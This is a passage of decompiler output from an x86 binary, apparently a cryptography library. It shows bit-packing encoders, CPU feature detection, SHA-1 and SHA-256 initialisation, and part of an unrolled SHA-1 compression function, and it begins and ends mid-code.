    this[4] = 0;
    goto LABEL_6;
  }
  v8 = v7 - 1;
  if ( v8 )
  {
    if ( v8 != 1 )
      return 0;
LABEL_24:
    if ( sub_454730(this, 2, this[14], this[9], v6, a5, (int)&dword_4EEDC0) )
    {
      result = 1;
      if ( (unsigned int)(this[9] - this[4]) > 1 )
        return this[9] - this[4];
      return result;
    }
    this[10] = 0;
    this[9] = 0;
    return 0;
  }
LABEL_18:
  if ( !sub_454730(this, 1, this[14], this[8], 0, a5, (int)&dword_4EEDC0) )
  {
    this[10] = 0;
    this[9] = 0;
LABEL_6:
    while ( 1 )
    {
      v10 = this[4];
      if ( v10 >= a3 )
        break;
      v11 = *(_DWORD *)(this[6] + 4 * *(unsigned __int8 *)(v10 + a2));
      this[4] = v10 + 1;
      if ( v11 < 0x100 )
      {
        v12 = this[9];
        if ( !v12 && !this[10] )
        {
          memset((void *)this[14], 0, this[8]);
          v12 = this[9];
        }
        v13 = (_BYTE *)(v12 + this[14]);
        v14 = this[10] + this[7];
        if ( v14 > 8 )
        {
          *v13 |= v11 >> (v14 - 8);
          v15 = this[14] + this[9];
          *(_BYTE *)(v15 + 1) |= (_BYTE)v11 << (16 - v14);
        }
        else
        {
          *v13 |= (_BYTE)v11 << (8 - v14);
        }
        v16 = this[9];
        this[10] = v14;
        if ( v14 >= 8 )
        {
          do
          {
            v14 -= 8;
            ++v16;
          }
          while ( v14 >= 8 );
          this[9] = v16;
          this[10] = v14;
        }
        if ( v16 == this[8] )
          goto LABEL_18;
      }
    }
    v6 = a4;
    if ( !a4 )
      return 0;
    goto LABEL_24;
  }
  result = 1;
  if ( (unsigned int)(this[8] - this[4]) > 1 )
    return this[8] - this[4];
  return result;
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (0045BD00) --------------------------------------------------------
int __thiscall sub_45BD00(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  int v5; // ebx
  int v7; // eax
  int v8; // eax
  int result; // eax
  unsigned int v10; // eax
  int v11; // ecx
  unsigned int v12; // edi
  unsigned int v13; // ebx
  unsigned int v14; // ebp
  _BYTE *v15; // edx
  int v16; // edx
  char v17; // cl
  int v18; // edi
  int v19; // ecx
  int i; // edi
  int v21; // edx
  unsigned int v22; // [esp+10h] [ebp-4h]

  v5 = a4;
  v7 = this[5];
  if ( !v7 )
  {
    this[4] = 0;
    goto LABEL_6;
  }
  v8 = v7 - 1;
  if ( v8 )
  {
    if ( v8 != 1 )
      return 0;
  }
  else
  {
LABEL_16:
    if ( sub_454730(this, 1, this[15], this[9], 0, a5, (int)&dword_4EEDC0) )
    {
      result = 1;
      if ( (unsigned int)(this[9] - this[4]) > 1 )
        return this[9] - this[4];
      return result;
    }
    this[11] = 0;
    this[10] = 0;
LABEL_6:
    while ( 1 )
    {
      v10 = this[4];
      if ( v10 >= a3 )
        break;
      v11 = this[10];
      if ( !v11 )
      {
        memset((void *)this[15], 0, this[9]);
        v10 = this[4];
        v11 = this[10];
      }
      v12 = 8;
      v13 = this[8] - this[11];
      v14 = *(unsigned __int8 *)(v10 + a2);
      v15 = (_BYTE *)(v11 + this[15]);
      this[4] = v10 + 1;
      v22 = v14;
      *v15 |= v14 >> (8 - v13);
      if ( v13 > 8 )
      {
LABEL_12:
        this[11] += v12;
        v16 = this[10];
      }
      else
      {
        while ( 1 )
        {
          v16 = this[10] + 1;
          this[11] = 0;
          this[10] = v16;
          v12 -= v13;
          if ( !v12 )
            break;
          v17 = v13;
          v13 = this[8];
          v22 = (unsigned __int8)(v22 << v17);
          *(_BYTE *)(this[15] + v16) |= v22 >> (8 - v13);
          if ( v12 < v13 )
            goto LABEL_12;
        }
      }
      if ( v16 == this[9] )
      {
        v18 = 0;
        if ( v16 > 0 )
        {
          do
          {
            *(_BYTE *)(this[15] + v18) = *(_BYTE *)(*(unsigned __int8 *)(this[15] + v18) + this[6]);
            ++v18;
          }
          while ( v18 < this[10] );
        }
        goto LABEL_16;
      }
    }
    v5 = a4;
    if ( !a4 )
      return 0;
    v19 = this[10];
    if ( (int)this[11] > 0 )
      this[10] = ++v19;
    for ( i = 0; i < v19; v19 = this[10] )
    {
      *(_BYTE *)(this[15] + i) = *(_BYTE *)(*(unsigned __int8 *)(this[15] + i) + this[6]);
      ++i;
    }
    v21 = this[7];
    if ( v21 != -1 && v19 > 0 )
    {
      memset((void *)(v19 + this[15]), v21, this[9] - v19);
      this[10] = this[9];
    }
  }
  if ( sub_454730(this, 2, this[15], this[10], v5, a5, (int)&dword_4EEDC0) )
  {
    result = 1;
    if ( (unsigned int)(this[10] - this[4]) > 1 )
      return this[10] - this[4];
  }
  else
  {
    this[11] = 0;
    this[10] = 0;
    return 0;
  }
  return result;
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (0045BEF0) --------------------------------------------------------
int __thiscall sub_45BEF0(_DWORD *this, int a2, unsigned int a3, int a4, int a5)
{
  int v6; // eax
  int v7; // ecx
  bool v8; // zf
  unsigned int v9; // eax
  unsigned int v10; // edi
  int v11; // eax
  int v12; // ecx
  unsigned int v13; // edi
  int result; // eax

  v6 = this[5];
  v7 = a4;
  switch ( v6 )
  {
    case 0:
      v8 = this[14] == 0;
      this[4] = 0;
      if ( v8 )
        goto LABEL_19;
      v9 = 0;
      goto LABEL_10;
    case 1:
      goto LABEL_4;
    case 2:
      goto LABEL_6;
    case 3:
LABEL_19:
      if ( !sub_454730(this, 3, a2, a3, 0, a5, (int)&dword_4EEDC0) )
        goto LABEL_23;
      result = 1;
      if ( a3 - this[4] > 1 )
        return a3 - this[4];
      return result;
    case 4:
      goto LABEL_24;
    default:
      return 0;
  }
  while ( 1 )
  {
LABEL_6:
    v10 = a3 - this[4];
    if ( this[14] - this[15] < v10 )
      v10 = this[14] - this[15];
    v11 = sub_454730(this, 2, this[4] + a2, v10, 0, a5, (int)&dword_4EEDC0);
    v12 = this[4];
    if ( v11 )
    {
      v13 = v10 - v12;
      result = 1;
      if ( v13 > 1 )
        return v13;
      return result;
    }
    this[15] += v10;
    v9 = v12 + v10;
    this[4] = v12 + v10;
LABEL_10:
    if ( v9 >= a3 )
      break;
    if ( this[15] == this[14] )
    {
LABEL_4:
      if ( sub_454730(this, 1, this[9], this[8], 0, a5, (int)&dword_4EEDC0) )
      {
        result = 1;
        if ( (unsigned int)(this[8] - this[4]) > 1 )
          return this[8] - this[4];
        return result;
      }
      this[15] = 0;
    }
  }
LABEL_23:
  v7 = a4;
  if ( !a4 )
    return 0;
LABEL_24:
  if ( !sub_454730(this, 4, this[13], this[12], v7, a5, (int)&dword_4EEDC0) )
  {
    this[15] = 0;
    return 0;
  }
  result = 1;
  if ( (unsigned int)(this[12] - this[4]) > 1 )
    return this[12] - this[4];
  return result;
}
// 4EEDC0: using guessed type int dword_4EEDC0;

//----- (0045C050) --------------------------------------------------------
int __stdcall sub_45C050(int a1)
{
  char v1; // al

  v1 = byte_4F0124;
  if ( !byte_4F0124 )
  {
    sub_466590();
    v1 = byte_4F0124;
  }
  if ( byte_4F012D )
  {
    sub_419B80(a1, "SHANI");
    return a1;
  }
  else
  {
    if ( !v1 )
      sub_466590();
    if ( byte_4F0125 )
      sub_419B80(a1, "SSE2");
    else
      sub_419B80(a1, "C++");
    return a1;
  }
}
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;
// 4F012D: using guessed type char byte_4F012D;

//----- (0045C0D0) --------------------------------------------------------
int __stdcall sub_45C0D0(int a1)
{
  sub_45D360(a1);
  return a1;
}

//----- (0045C0F0) --------------------------------------------------------
int __thiscall sub_45C0F0(__m128i **this, __m128i *a2, unsigned int a3)
{
  unsigned int v5; // edi
  int v6; // ebx
  int v7; // esi
  int *v8; // ecx
  bool v9; // [esp+Bh] [ebp-1h]

  if ( !byte_4F0124 )
    sub_466590();
  if ( byte_4F012D )
  {
    sub_467D10(this[46], a2, a3, 1);
    return a3 & 0x3F;
  }
  else
  {
    v9 = ((int (__thiscall *)(__m128i **))(*this)[5].m128i_i32[0])(this) == 0;
    v5 = a3;
    v6 = ((int (__thiscall *)(__m128i **))(*this)[5].m128i_i32[3])(this);
    v7 = (int)a2;
    do
    {
      if ( v9 )
      {
        v8 = (int *)v7;
      }
      else
      {
        sub_457947(v6, v7, 0x40u);
        v8 = (int *)v6;
      }
      sub_45C2D0(this[46]->m128i_i32, v8);
      v5 -= 64;
      v7 += 64;
    }
    while ( v5 >= 0x40 );
    return v5;
  }
}
// 4F0124: using guessed type char byte_4F0124;
// 4F012D: using guessed type char byte_4F012D;

//----- (0045C1A0) --------------------------------------------------------
int __thiscall sub_45C1A0(__m128i **this, __m128i *a2, unsigned int a3)
{
  char v3; // al
  unsigned int v6; // edi
  int v7; // ebx
  int v8; // esi
  unsigned int *v9; // ecx
  bool v10; // [esp+Bh] [ebp-1h]

  v3 = byte_4F0124;
  if ( !byte_4F0124 )
  {
    sub_466590();
    v3 = byte_4F0124;
  }
  if ( byte_4F012D )
  {
    sub_467FB0(this[48], a2, a3, 1);
    return a3 & 0x3F;
  }
  else
  {
    if ( !v3 )
      sub_466590();
    if ( byte_4F0125 )
    {
      sub_45E0F0(this[48], (unsigned int *)a2, a3 - (a3 & 0x3F));
      return a3 & 0x3F;
    }
    else
    {
      v10 = ((int (__thiscall *)(__m128i **))(*this)[5].m128i_i32[0])(this) == 0;
      v6 = a3;
      v7 = ((int (__thiscall *)(__m128i **))(*this)[5].m128i_i32[3])(this);
      v8 = (int)a2;
      do
      {
        if ( v10 )
        {
          v9 = (unsigned int *)v8;
        }
        else
        {
          sub_457947(v7, v8, 0x40u);
          v9 = (unsigned int *)v7;
        }
        sub_45D3D0((__int128 *)this[48]->m128i_i8, v9);
        v6 -= 64;
        v8 += 64;
      }
      while ( v6 >= 0x40 );
      return v6;
    }
  }
}
// 4F0124: using guessed type char byte_4F0124;
// 4F0125: using guessed type char byte_4F0125;
// 4F012D: using guessed type char byte_4F012D;

//----- (0045C280) --------------------------------------------------------
_DWORD *__cdecl sub_45C280(_DWORD *a1)
{
  _DWORD *result; // eax

  result = a1;
  *a1 = 1732584193;
  a1[1] = -271733879;
  a1[2] = -1732584194;
  a1[3] = 271733878;
  a1[4] = -1009589776;
  return result;
}

//----- (0045C2B0) --------------------------------------------------------
_OWORD *__cdecl sub_45C2B0(_OWORD *a1)
{
  _OWORD *result; // eax

  result = a1;
  *a1 = SHA256_Constants_4BC698;
  a1[1] = SHA256_Constants_4BC6A8;
  return result;
}

//----- (0045C2D0) --------------------------------------------------------
int __cdecl sub_45C2D0(int *a1, int *a2)
{
  int v2; // ebp
  int v3; // edx
  int v4; // edi
  int v5; // esi
  int v6; // eax
  int v7; // ebp
  int v8; // ebx
  int v9; // eax
  int v10; // edi
  int v11; // edx
  int v12; // eax
  int v13; // ebx
  int v14; // esi
  int v15; // eax
  int v16; // edx
  int v17; // ebp
  int v18; // eax
  int v19; // esi
  int v20; // eax
  int v21; // ebp
  int v22; // ebx
  int v23; // edi
  int v24; // esi
  int v25; // eax
  int v26; // edi
  int v27; // edx
  int v28; // eax
  int v29; // esi
  int v30; // ebx
  int v31; // eax
  int v32; // edx
  int v33; // ebp
  int v34; // eax
  int v35; // ebx
  int v36; // edi
  int v37; // eax
  int v38; // ebp
  int v39; // esi
  int v40; // eax
  int v41; // edi
  int v42; // eax
  int v43; // esi
  int v44; // edx
  int v45; // ebx
  int v46; // ebp
  int v47; // edx
  int v48; // ebx
  int v49; // edx
  int v50; // esi
  int v51; // ebp
  int v52; // eax
  int v53; // edx
  int v54; // edi
  int v55; // eax
  int v56; // esi
  int v57; // ebx
  int v58; // eax
  int v59; // edi
  int v60; // ebp
  int v61; // eax
  int v62; // ebx
  int v63; // edx
  int v64; // eax
  int v65; // ebp
  int v66; // esi
  int v67; // eax
  int v68; // edx
  int v69; // edi
  int v70; // eax
  int v71; // esi
  int v72; // ebx
  int v73; // eax
  int v74; // edi
  int v75; // ebp
  int v76; // eax
  int v77; // ebx
  int v78; // edx
  int v79; // eax
  int v80; // ebp
  int v81; // esi
  int v82; // eax
  int v83; // edx
  int v84; // edi
  int v85; // eax
  int v86; // esi
  int v87; // ebx
  int v88; // eax
  int v89; // edi
  int v90; // ebp
  int v91; // eax
  int v92; // ebx
  int v93; // edx
  int v94; // eax
  int v95; // ebp
  int v96; // esi
  int v97; // eax
  int v98; // edx
  int v99; // edi
  int v100; // eax
  int v101; // esi
  int v102; // ebx
  int v103; // eax
  int v104; // edi
  int v105; // ebp
  int v106; // eax
  int v107; // ebx
  int v108; // ecx
  int v109; // ebp
  int v110; // esi
  int v111; // edi
  int v112; // ebx
  int v113; // ebp
  int v114; // esi
  int v115; // edi
  int v116; // ebx
  int v117; // ebp
  int v118; // esi
  int v119; // edi
  int v120; // ebx
  int v121; // eax
  int v122; // ebp
  int v123; // ecx
  int v124; // ecx
  int v125; // esi
  int v126; // ecx
  int v127; // edi
  int v128; // ecx
  int v129; // esi
  int v130; // ebx
  int v131; // ecx
  int v132; // eax
  int v133; // edi
  int v134; // ebp
  int v135; // ecx
  int v136; // ebx
  int v137; // edx
  int v138; // eax
  int v139; // ebp
  int v140; // esi
  int v141; // eax
  int v142; // edx
  int v143; // edi
  int v144; // eax
  int v145; // esi
  int v146; // ebx
  int v147; // eax
  int v148; // edi
  int v149; // ebp
  int v150; // eax
  int v151; // ebx
  int v152; // edx
  int v153; // eax
  int v154; // ebp
  int v155; // esi
  int v156; // eax
  int v157; // edx
  int v158; // edi
  int v159; // eax
  int v160; // esi
  int v161; // ebx
  int v162; // eax
  int v163; // edi
  int v164; // ebp
  int v165; // eax
  int v166; // ebx
  int v167; // edx
  int v168; // eax
  int v169; // ebp
  int v170; // esi
  int v171; // eax
  int v172; // edx
  int v173; // eax
  int v174; // ebx
  int v175; // edi
  int v176; // ebp
  int v177; // eax
  int v178; // edx
  int v179; // esi
  int v180; // edx
  int v181; // ecx
  int v182; // edi
  int v183; // ebx
  int v184; // ecx
  int v185; // ebp
  int v186; // esi
  int v187; // eax
  int v188; // ebx
  int v189; // edx
  int result; // eax
  int v191; // [esp+10h] [ebp-4Ch]
  int v192; // [esp+10h] [ebp-4Ch]
  int v193; // [esp+10h] [ebp-4Ch]
  int v194; // [esp+10h] [ebp-4Ch]
  int v195; // [esp+14h] [ebp-48h]
  int v196; // [esp+14h] [ebp-48h]
  int v197; // [esp+14h] [ebp-48h]
  int v198; // [esp+14h] [ebp-48h]
  int v199; // [esp+14h] [ebp-48h]
  int v200; // [esp+14h] [ebp-48h]
  int v201; // [esp+14h] [ebp-48h]
  int v202; // [esp+18h] [ebp-44h]
  int v203; // [esp+18h] [ebp-44h]
  int v204; // [esp+18h] [ebp-44h]
  int v205; // [esp+18h] [ebp-44h]
  int v206; // [esp+1Ch] [ebp-40h]
  int v207; // [esp+1Ch] [ebp-40h]
  int v208; // [esp+1Ch] [ebp-40h]
  int v209; // [esp+20h] [ebp-3Ch]
  int v210; // [esp+20h] [ebp-3Ch]
  int v211; // [esp+20h] [ebp-3Ch]
  int v212; // [esp+20h] [ebp-3Ch]
  int v213; // [esp+20h] [ebp-3Ch]
  int v214; // [esp+20h] [ebp-3Ch]
  int v215; // [esp+24h] [ebp-38h]
  int v216; // [esp+24h] [ebp-38h]
  int v217; // [esp+24h] [ebp-38h]
  int v218; // [esp+24h] [ebp-38h]
  int v219; // [esp+24h] [ebp-38h]
  int v220; // [esp+28h] [ebp-34h]
  int v221; // [esp+28h] [ebp-34h]
  int v222; // [esp+28h] [ebp-34h]
  int v223; // [esp+28h] [ebp-34h]
  int v224; // [esp+2Ch] [ebp-30h]
  int v225; // [esp+2Ch] [ebp-30h]
  int v226; // [esp+2Ch] [ebp-30h]
  int v227; // [esp+2Ch] [ebp-30h]
  int v228; // [esp+30h] [ebp-2Ch]
  int v229; // [esp+30h] [ebp-2Ch]
  int v230; // [esp+30h] [ebp-2Ch]
  int v231; // [esp+30h] [ebp-2Ch]
  int v232; // [esp+34h] [ebp-28h]
  int v233; // [esp+34h] [ebp-28h]
  int v234; // [esp+34h] [ebp-28h]
  int v235; // [esp+34h] [ebp-28h]
  int v236; // [esp+38h] [ebp-24h]
  int v237; // [esp+38h] [ebp-24h]
  int v238; // [esp+38h] [ebp-24h]
  int v239; // [esp+38h] [ebp-24h]
  int v240; // [esp+3Ch] [ebp-20h]
  int v241; // [esp+3Ch] [ebp-20h]
  int v242; // [esp+3Ch] [ebp-20h]
  int v243; // [esp+3Ch] [ebp-20h]
  int v244; // [esp+3Ch] [ebp-20h]
  int v245; // [esp+40h] [ebp-1Ch]
  int v246; // [esp+40h] [ebp-1Ch]
  int v247; // [esp+40h] [ebp-1Ch]
  int v248; // [esp+40h] [ebp-1Ch]
  int v249; // [esp+44h] [ebp-18h]
  int v250; // [esp+44h] [ebp-18h]
  int v251; // [esp+44h] [ebp-18h]
  int v252; // [esp+44h] [ebp-18h]
  int v253; // [esp+44h] [ebp-18h]
  int v254; // [esp+48h] [ebp-14h]
  int v255; // [esp+48h] [ebp-14h]
  int v256; // [esp+48h] [ebp-14h]
  int v257; // [esp+48h] [ebp-14h]
  int v258; // [esp+4Ch] [ebp-10h]
  int v259; // [esp+4Ch] [ebp-10h]
  int v260; // [esp+4Ch] [ebp-10h]
  int v261; // [esp+4Ch] [ebp-10h]
  int v262; // [esp+4Ch] [ebp-10h]
  int v263; // [esp+4Ch] [ebp-10h]
  int v264; // [esp+50h] [ebp-Ch]
  int v265; // [esp+50h] [ebp-Ch]
  int v266; // [esp+50h] [ebp-Ch]
  int v267; // [esp+50h] [ebp-Ch]
  int v268; // [esp+50h] [ebp-Ch]
  int v269; // [esp+54h] [ebp-8h]
  int v270; // [esp+54h] [ebp-8h]
  int v271; // [esp+54h] [ebp-8h]
  int v272; // [esp+54h] [ebp-8h]
  int v273; // [esp+54h] [ebp-8h]
  int v274; // [esp+54h] [ebp-8h]
  int v275; // [esp+54h] [ebp-8h]
  int v276; // [esp+54h] [ebp-8h]
  int v277; // [esp+54h] [ebp-8h]
  int v278; // [esp+54h] [ebp-8h]
  int v279; // [esp+54h] [ebp-8h]
  int v280; // [esp+58h] [ebp-4h]
  int v281; // [esp+58h] [ebp-4h]
  int v282; // [esp+58h] [ebp-4h]
  int v283; // [esp+58h] [ebp-4h]
  int v284; // [esp+58h] [ebp-4h]
  int v285; // [esp+58h] [ebp-4h]
  int v286; // [esp+58h] [ebp-4h]
  int v287; // [esp+58h] [ebp-4h]
  int v288; // [esp+58h] [ebp-4h]
  int v289; // [esp+58h] [ebp-4h]
  int v290; // [esp+58h] [ebp-4h]
  int v291; // [esp+58h] [ebp-4h]
  int v292; // [esp+64h] [ebp+8h]
  int v293; // [esp+64h] [ebp+8h]
  int v294; // [esp+64h] [ebp+8h]
  int v295; // [esp+64h] [ebp+8h]

  v258 = *a2;
  v2 = a1[4] + __ROL4__(*a1, 5) + (a1[3] ^ a1[1] & (a1[2] ^ a1[3])) + *a2 + 1518500249;
  v3 = __ROR4__(a1[1], 2);
  v209 = a2[1];
  v4 = a1[3] + 1518500249 + (a1[2] ^ *a1 & (v3 ^ a1[2])) + v209 + __ROL4__(v2, 5);
  v5 = __ROR4__(*a1, 2);
  v6 = v2 & (v5 ^ v3);
  v269 = a2[2];
  v7 = __ROR4__(v2, 2);
  v8 = v269 + __ROL4__(v4, 5) + (v3 ^ v6) + a1[2] + 1518500249;
  v236 = a2[3];
  v9 = v4 & (v5 ^ v7);
  v10 = __ROR4__(v4, 2);
  v11 = v236 + __ROL4__(v8, 5) + (v5 ^ v9) + v3 + 1518500249;
  v232 = a2[4];
  v12 = v7 ^ v8 & (v10 ^ v7);
  v13 = __ROR4__(v8, 2);
  v14 = v232 + __ROL4__(v11, 5) + v12 + v5 + 1518500249;
  v228 = a2[5];
  v15 = v11 & (v13 ^ v10);
  v16 = __ROR4__(v11, 2);
  v17 = v228 + __ROL4__(v14, 5) + 1518500249 + (v10 ^ v15) + v7;
  v224 = a2[6];
  v18 = v14 & (v16 ^ v13);
  v19 = __ROR4__(v14, 2);
  v264 = v10 + 1518500249 + (v13 ^ v18) + v224 + __ROL4__(v17, 5);
  v215 = a2[7];
  v220 = a2[8];
  v20 = v17 & (v19 ^ v16);
  v21 = __ROR4__(v17, 2);
  v280 = v13 + 1518500249 + v215 + __ROL4__(v264, 5) + (v16 ^ v20);
  v22 = __ROR4__(v264, 2);
  v23 = v16 + 1518500249 + (v19 ^ v264 & (v19 ^ v21)) + __ROL4__(v280, 5) + v220;
  v254 = a2[9];
  v24 = v254 + __ROL4__(v23, 5) + 1518500249 + (v21 ^ v280 & (v22 ^ v21)) + v19;
  v281 = __ROR4__(v280, 2);
  v249 = a2[10];
  v25 = v23 & (v281 ^ v22);
  v26 = __ROR4__(v23, 2);
  v27 = v249 + __ROL4__(v24, 5) + (v22 ^ v25) + v21 + 1518500249;
  v245 = a2[11];
  v28 = v24 & (v26 ^ v281);
  v29 = __ROR4__(v24, 2);
  v30 = v245 + __ROL4__(v27, 5) + (v281 ^ v28) + v22 + 1518500249;
  v240 = a2[12];
  v31 = v27 & (v29 ^ v26);
  v32 = __ROR4__(v27, 2);
  v33 = v240 + __ROL4__(v30, 5) + (v26 ^ v31) + v281 + 1518500249;
  v202 = a2[13];
  v34 = v30 & (v29 ^ v32);
  v35 = __ROR4__(v30, 2);
  v36 = v202 + __ROL4__(v33, 5) + 1518500249 + (v29 ^ v34) + v26;
  v191 = a2[14];
  v37 = v33 & (v35 ^ v32);
  v38 = __ROR4__(v33, 2);
  v39 = v191 + __ROL4__(v36, 5) + 1518500249 + (v32 ^ v37) + v29;
  v292 = a2[15];
  v40 = v292 + __ROL4__(v39, 5) + (v35 ^ v36 & (v38 ^ v35));
  v41 = __ROR4__(v36, 2);
  v195 = v32 + 1518500249 + v40;
  v42 = v38 ^ v39 & (v41 ^ v38);
  v259 = __ROL4__(v258 ^ v269 ^ v220 ^ v202, 1);
  v43 = __ROR4__(v39, 2);
  v44 = v35 + 1518500249 + v42 + __ROL4__(v195, 5) + v259;
  v265 = __ROL4__(v209 ^ v236 ^ v254 ^ v191, 1);
  v45 = v265 + __ROL4__(v44, 5) + (v41 ^ v195 & (v43 ^ v41)) + v38 + 1518500249;
  v196 = __ROR4__(v195, 2);
  v270 = __ROL4__(v269 ^ v232 ^ v249 ^ v292, 1);
  v210 = __ROR4__(v44, 2);
  v46 = v41 + 1518500249 + (v43 ^ v44 & (v43 ^ v196)) + __ROL4__(v45, 5) + v270;
  v47 = v196 ^ v45 & (v196 ^ v210);
  v48 = __ROR4__(v45, 2);
  v206 = __ROL4__(v259 ^ v236 ^ v228 ^ v245, 1);
  v49 = v43 + 1518500249 + v206 + __ROL4__(v46, 5) + v47;
  v282 = __ROL4__(v265 ^ v232 ^ v224 ^ v240, 1);
  v50 = v196 + 1859775393 + (v46 ^ v48 ^ v210) + __ROL4__(v49, 5) + v282;
  v197 = __ROL4__(v270 ^ v228 ^ v215 ^ v202, 1);
  v51 = __ROR4__(v46, 2);
  v52 = v49 ^ v51 ^ v48;
  v53 = __ROR4__(v49, 2);
  v54 = v197 + __ROL4__(v50, 5) + v52 + v210 + 1859775393;
  v211 = __ROL4__(v206 ^ v224 ^ v220 ^ v191, 1);
  v55 = v53 ^ v51 ^ v50;
  v56 = __ROR4__(v50, 2);
  v57 = v211 + __ROL4__(v54, 5) + 1859775393 + v55 + v48;
  v216 = __ROL4__(v282 ^ v215 ^ v254 ^ v292, 1);
  v58 = v53 ^ v54 ^ v56;
  v59 = __ROR4__(v54, 2);
  v60 = v216 + __ROL4__(v57, 5) + 1859775393 + v58 + v51;
  v221 = __ROL4__(v259 ^ v197 ^ v220 ^ v249, 1);
  v61 = v221 + __ROL4__(v60, 5) + 1859775393 + (v57 ^ v59 ^ v56);
  v62 = __ROR4__(v57, 2);
  v63 = v61 + v53;
  v225 = __ROL4__(v265 ^ v211 ^ v254 ^ v245, 1);
  v64 = v225 + __ROL4__(v63, 5) + 1859775393 + (v60 ^ v62 ^ v59);
  v65 = __ROR4__(v60, 2);
  v66 = v64 + v56;
  v229 = __ROL4__(v270 ^ v216 ^ v249 ^ v240, 1);
  v67 = v229 + __ROL4__(v66, 5) + 1859775393 + (v63 ^ v65 ^ v62);
  v68 = __ROR4__(v63, 2);
  v69 = v67 + v59;
  v233 = __ROL4__(v206 ^ v221 ^ v245 ^ v202, 1);
  v70 = v68 ^ v65 ^ v66;
  v71 = __ROR4__(v66, 2);
  v72 = v233 + __ROL4__(v69, 5) + 1859775393 + v70 + v62;
  v237 = __ROL4__(v282 ^ v225 ^ v240 ^ v191, 1);
  v73 = v68 ^ v69 ^ v71;
  v74 = __ROR4__(v69, 2);
  v75 = v237 + __ROL4__(v72, 5) + 1859775393 + v73 + v65;
  v203 = __ROL4__(v197 ^ v229 ^ v202 ^ v292, 1);
  v76 = v203 + __ROL4__(v75, 5) + 1859775393 + (v72 ^ v74 ^ v71);
  v77 = __ROR4__(v72, 2);
  v78 = v76 + v68;
  v192 = __ROL4__(v259 ^ v211 ^ v233 ^ v191, 1);
  v79 = v192 + __ROL4__(v78, 5) + 1859775393 + (v75 ^ v77 ^ v74);
  v80 = __ROR4__(v75, 2);
  v81 = v79 + v71;
  v293 = __ROL4__(v265 ^ v216 ^ v237 ^ v292, 1);
  v82 = v293 + __ROL4__(v81, 5) + 1859775393 + (v78 ^ v80 ^ v77);
  v83 = __ROR4__(v78, 2);
  v84 = v82 + v74;
  v241 = __ROL4__(v259 ^ v270 ^ v221 ^ v203, 1);
  v85 = v83 ^ v80 ^ v81;
  v86 = __ROR4__(v81, 2);
  v87 = v241 + __ROL4__(v84, 5) + 1859775393 + v85 + v77;
  v246 = __ROL4__(v265 ^ v206 ^ v225 ^ v192, 1);
  v88 = v83 ^ v84 ^ v86;
  v89 = __ROR4__(v84, 2);
  v90 = v246 + __ROL4__(v87, 5) + 1859775393 + v88 + v80;
  v250 = __ROL4__(v270 ^ v282 ^ v229 ^ v293, 1);
  v91 = v250 + __ROL4__(v90, 5) + 1859775393 + (v87 ^ v89 ^ v86);
  v92 = __ROR4__(v87, 2);
  v93 = v91 + v83;
  v207 = __ROL4__(v241 ^ v206 ^ v197 ^ v233, 1);
  v94 = v90 ^ v92 ^ v89;
  v95 = __ROR4__(v90, 2);
  v96 = v207 + __ROL4__(v93, 5) + 1859775393 + v94 + v86;
  v255 = __ROL4__(v246 ^ v282 ^ v211 ^ v237, 1);
  v97 = v255 + __ROL4__(v96, 5) + 1859775393 + (v93 ^ v95 ^ v92);
  v98 = __ROR4__(v93, 2);
  v99 = v97 + v89;
  v198 = __ROL4__(v250 ^ v197 ^ v216 ^ v203, 1);
  v100 = v98 ^ v95 ^ v96;
  v101 = __ROR4__(v96, 2);
  v102 = v198 + __ROL4__(v99, 5) + 1859775393 + v100 + v92;
  v212 = __ROL4__(v207 ^ v211 ^ v221 ^ v192, 1);
  v103 = v98 ^ v99 ^ v101;
  v104 = __ROR4__(v99, 2);
  v105 = v212 + __ROL4__(v102, 5) + 1859775393 + v103 + v95;
  v217 = __ROL4__(v255 ^ v216 ^ v225 ^ v293, 1);
  v106 = v217 + __ROL4__(v105, 5) + 1859775393 + (v102 ^ v104 ^ v101);
  v107 = __ROR4__(v102, 2);
  v222 = __ROL4__(v241 ^ v198 ^ v221 ^ v229, 1);
  v108 = v105 & v107 | v104 & (v105 | v107);
  v109 = __ROR4__(v105, 2);
  v226 = __ROL4__(v246 ^ v212 ^ v225 ^ v233, 1);
  v271 = v101 - 1894007588 + v222 + v108 + __ROL4__(v106 + v98, 5);
  v110 = __ROR4__(v106 + v98, 2);
  v230 = __ROL4__(v250 ^ v217 ^ v229 ^ v237, 1);
  v283 = v104 - 1894007588 + v226 + ((v106 + v98) & v109 | v107 & ((v106 + v98) | v109)) + __ROL4__(v271, 5);
  v111 = __ROR4__(v271, 2);
  v234 = __ROL4__(v207 ^ v222 ^ v233 ^ v203, 1);
  v272 = v107 - 1894007588 + v230 + (v110 & v271 | v109 & (v110 | v271)) + __ROL4__(v283, 5);
  v112 = __ROR4__(v283, 2);
  v284 = v109 + v234 + (v283 & v111 | v110 & (v283 | v111)) - 1894007588 + __ROL4__(v272, 5);
  v238 = __ROL4__(v255 ^ v226 ^ v237 ^ v192, 1);
  v113 = __ROR4__(v272, 2);
  v204 = __ROL4__(v198 ^ v230 ^ v203 ^ v293, 1);
  v273 = v110 - 1894007588 + v238 + (v272 & v112 | v111 & (v272 | v112)) + __ROL4__(v284, 5);
  v114 = __ROR4__(v284, 2);
  v193 = __ROL4__(v241 ^ v212 ^ v234 ^ v192, 1);
  v285 = v111 - 1894007588 + v204 + (v284 & v113 | v112 & (v284 | v113)) + __ROL4__(v273, 5);
  v115 = __ROR4__(v273, 2);
  v294 = __ROL4__(v246 ^ v217 ^ v238 ^ v293, 1);
  v274 = v112 - 1894007588 + v193 + (v273 & v114 | v113 & (v273 | v114)) + __ROL4__(v285, 5);
  v116 = __ROR4__(v285, 2);
  v286 = v113 - 1894007588 + v294 + (v115 & v285 | v114 & (v115 | v285)) + __ROL4__(v274, 5);
  v242 = __ROL4__(v241 ^ v250 ^ v222 ^ v204, 1);
  v117 = __ROR4__(v274, 2);
  v247 = __ROL4__(v246 ^ v207 ^ v226 ^ v193, 1);
  v275 = v114 - 1894007588 + v242 + (v274 & v116 | v115 & (v274 | v116)) + __ROL4__(v286, 5);
  v118 = __ROR4__(v286, 2);
  v251 = __ROL4__(v250 ^ v255 ^ v230 ^ v294, 1);
  v287 = v115 - 1894007588 + v247 + (v286 & v117 | v116 & (v286 | v117)) + __ROL4__(v275, 5);
  v119 = __ROR4__(v275, 2);
  v208 = __ROL4__(v242 ^ v207 ^ v198 ^ v234, 1);
